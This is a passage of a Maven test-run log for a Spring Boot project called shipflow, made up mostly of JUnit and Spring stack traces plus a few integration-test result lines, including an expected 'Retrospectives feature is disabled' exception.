	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 15, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.403 s -- in com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$AuthorizationTests
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.018 s -- in com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$AuthorizationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$ProjectSettingTests
2026-01-17T23:26:46.814Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Unexpected runtime exception: Retrospectives feature is disabled for this project

java.lang.IllegalStateException: Retrospectives feature is disabled for this project
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.validateRetrospectivesEnabled(RetroService.java:429) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.getAllRetrosByProject(RetroService.java:34) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RetroService$$SpringCGLIB$$0.getAllRetrosByProject(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroController.getRetrosByProject(RetroController.java:30) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:713) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroController$$SpringCGLIB$$0.getRetrosByProject(<generated>) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
